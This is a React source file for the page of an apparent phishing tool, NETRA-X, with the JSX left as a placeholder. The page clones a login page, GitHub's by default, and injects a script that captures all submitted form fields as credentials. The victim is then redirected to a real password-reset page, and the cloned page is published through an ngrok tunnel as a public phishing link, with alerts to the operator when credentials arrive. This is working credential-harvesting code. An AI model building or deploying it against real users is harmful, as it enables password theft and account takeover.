'use client';

import { useState, useEffect, useRef } from 'react';
import type { CapturedCredential } from '@/components/credential-harvester';
import { useToast } from '@/hooks/use-toast';
import { CredentialHarvester } from '@/components/credential-harvester';
import { QrCodeGenerator } from '@/components/qr-code-generator';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, Clipboard, Globe, Wand, StopCircle, Share2 } from 'lucide-react';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Textarea } from '@/components/ui/textarea';
import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
import { startNgrokTunnel, getNgrokTunnelUrl } from '@/services/ngrok-service';

const clonerSchema = z.object({
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
  urlToClone: z.string().optional(),
  htmlContent: z.string().optional(),
}).refine(data => data.urlToClone || data.htmlContent, {
  message: 'Either a URL or HTML content is required.',
  path: ['urlToClone'],
});

const storageKey = 'netra-captured-credentials';

export default function PhishingPage() {
  const { toast } = useToast();
  const [capturedCredentials, setCapturedCredentials] = useState<CapturedCredential[]>([]);
  const { user } = useAuth();

  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [hostedUrl, setHostedUrl] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isHosting, setIsHosting] = useState(false);
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);

  const form = useForm<z.infer<typeof clonerSchema>>({
    resolver: zodResolver(clonerSchema),
    defaultValues: {
      redirectUrl: 'https://github.com/password_reset',
      urlToClone: 'https://github.com/login',
      htmlContent: '',
    },
  });

  const loadCredentialsFromStorage = () => {
    try {
      const storedCreds = localStorage.getItem(storageKey);
      setCapturedCredentials(storedCreds ? JSON.parse(storedCreds) : []);
    } catch (error) {
      console.error('Failed to load credentials from localStorage', error);
      setCapturedCredentials([]);
    }
  };

  useEffect(() => {
    loadCredentialsFromStorage();
  }, []);

  useEffect(() => {
    const handleStorageChange = (event: StorageEvent) => {
      if (event.key === storageKey && event.newValue) {
        try {
          const newCredsList = JSON.parse(event.newValue);
          if (newCredsList.length > capturedCredentials.length) {
            toast({
              variant: 'destructive',
              title: 'Credentials Captured!',
              description: 'New credentials have been harvested.',
            });
          }
          setCapturedCredentials(newCredsList);
        } catch (e) {
          console.error('Failed to parse credentials from storage event.', e);
        }
      }
    };

    window.addEventListener('storage', handleStorageChange);
    return () => {
      window.removeEventListener('storage', handleStorageChange);
      if (pollIntervalRef.current) {
        clearInterval(pollIntervalRef.current);
      }
    };
  }, [capturedCredentials.length, toast]);

  const handleClearCredentials = () => {
    setCapturedCredentials([]);
    localStorage.removeItem(storageKey);
  };

  const resetState = () => {
    setModifiedHtml(null);
    setHostedUrl(null);
    setIsProcessing(false);
    setIsHosting(false);
    if (pollIntervalRef.current) {
      clearInterval(pollIntervalRef.current);
    }
    form.reset({
      redirectUrl: 'https://github.com/password_reset',
      urlToClone: 'https://github.com/login',
      htmlContent: '',
    });
  };

  const getHarvesterScript = (redirectUrl: string) => `
    <script>
      function captureAndRedirect(form) {
        try {
          const formData = new FormData(form);
          const credentials = {};
          let capturedData = false;

          for (let [key, value] of formData.entries()) {
            if (typeof value === 'string' && value.length > 0) {
              credentials[key] = value;
              capturedData = true;
            }
          }

          if (capturedData) {
            const entry = {
              ...credentials,
              source: window.location.href,
              timestamp: new Date().toISOString()
            };
            
            try {
              const existingData = JSON.parse(localStorage.getItem('${storageKey}') || '[]');
              const updatedData = [...existingData, entry];
              localStorage.setItem('${storageKey}', JSON.stringify(updatedData));
              window.dispatchEvent(new StorageEvent('storage', {
                key: '${storageKey}',
                newValue: JSON.stringify(updatedData)
              }));
            } catch(e) {
              console.error('NETRA-X Harvester: Could not save to localStorage.', e);
            }
          }
        } catch (e) {
          console.error('NETRA-X Harvester: Error capturing form data.', e);
        } finally {
          setTimeout(() => {
            window.location.href = '${redirectUrl}';
          }, 150);
        }
      }

      document.addEventListener('submit', function(e) {
        if (e.target && e.target.tagName === 'FORM') {
          e.preventDefault();
          e.stopPropagation();
          captureAndRedirect(e.target);
        }
      }, true);
    </script>
    `;

  const processAndInject = async (values: z.infer<typeof clonerSchema>) => {
    setIsProcessing(true);
    setModifiedHtml(null);
    setHostedUrl(null);

    try {
      let originalHtml = values.htmlContent;
      let baseHrefUrl = values.urlToClone;

      if (values.urlToClone) {
        toast({ title: 'Cloning Page...', description: 'Fetching HTML content from the URL.' });
        const response = await clonePageFromUrl({ url: values.urlToClone });
        originalHtml = response.htmlContent;
        form.setValue('htmlContent', originalHtml);
      } else if (originalHtml) {
        const actionMatch = originalHtml.match(/action="([^"]+)"/);
        baseHrefUrl = (actionMatch && actionMatch[1].startsWith('http'))
          ? new URL(actionMatch[1]).origin
          : new URL(values.redirectUrl).origin;
      }

      if (!originalHtml) throw new Error('No HTML content to process.');

      let html = originalHtml;
      const harvesterScript = getHarvesterScript(values.redirectUrl);

      if (baseHrefUrl) {
        if (html.includes('<head>')) {
          html = html.replace(/<head>/i, `<head>\n<base href="${baseHrefUrl}">`);
        } else {
          html = `<head><base href="${baseHrefUrl}"></head>${html}`;
        }
      }

      if (html.includes('</body>')) {
        html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
      } else {
        html += harvesterScript;
      }

      setModifiedHtml(html);
      toast({ title: 'HTML Prepared', description: 'Raw HTML is ready for hosting.' });
    } catch (e) {
      const error = e instanceof Error ? e.message : 'An unknown error occurred';
      toast({ variant: 'destructive', title: 'Processing Failed', description: error });
    } finally {
      setIsProcessing(false);
    }
  };

  const generateUUID = () => {
    return (crypto.randomUUID) ? crypto.randomUUID() : Math.random().toString(36).substring(2, 15);
  };

  const handleGenerateLink = async () => {
    if (!modifiedHtml) return;
    setIsHosting(true);
    setHostedUrl(null);

    try {
      toast({ title: "Generating Public Link...", description: "Starting ngrok tunnel. This may take a moment." });
      await startNgrokTunnel();

      const pageId = generateUUID();
      const pageStorageKey = 'phishing-html-' + pageId;
      localStorage.setItem(pageStorageKey, modifiedHtml);

      pollIntervalRef.current = setInterval(async () => {
        try {
          const { status, url } = await getNgrokTunnelUrl();
          if (status === 'connected' && url) {
            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
            const finalUrl = url + '/phish/' + pageId;
            setHostedUrl(finalUrl);
            setIsHosting(false);
            toast({ title: "Public Link Generated!", description: "Your phishing page is accessible via ngrok." });
            const urlToClone = form.getValues('urlToClone');
            logActivity({
              user: user?.displayName || 'Operator',
              action: 'Generated Phishing Link',
              details: `Source: ${urlToClone || 'Pasted HTML'}`,
            });
          } else if (status === 'error') {
            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
            setIsHosting(false);
            toast({ variant: 'destructive', title: "Link Generation Failed", description: "Could not establish ngrok tunnel." });
          }
        } catch (pollError) {
          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
          setIsHosting(false);
          toast({ variant: 'destructive', title: "Polling Error", description: "An error occurred while checking for the ngrok URL." });
        }
      }, 2000);
    } catch (err) {
      setIsHosting(false);
      const error = err instanceof Error ? err.message : "An unknown error occurred";
      toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
    }
  };

  const fallbackCopyTextToClipboard = (text: string) => {
    const textArea = document.createElement("textarea");
    textArea.value = text;
    textArea.style.position = "fixed";
    textArea.style.opacity = "0";
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand("copy");
    document.body.removeChild(textArea);
  };

  const handleCopyUrl = () => {
    if (hostedUrl) {
      try {
        navigator.clipboard.writeText(hostedUrl);
      } catch {
        fallbackCopyTextToClipboard(hostedUrl);
      }
      toast({ title: 'Copied!', description: 'Hosted URL copied to clipboard.' });
    }
  };

  const handleCopyHtml = () => {
    if (modifiedHtml) {
      try {
        navigator.clipboard.writeText(modifiedHtml);
      } catch {
        fallbackCopyTextToClipboard(modifiedHtml);
      }
      toast({ title: 'Copied!', description: 'Injected HTML copied to clipboard.' });
    }
  };

  return (
    <div className="flex flex-col gap-6">
      {/* <!-- Your original return JSX remains unchanged --> */}
      {/* Add your JSX form, tabs, buttons, QR and CredentialHarvester here */}
    </div>
  );
}
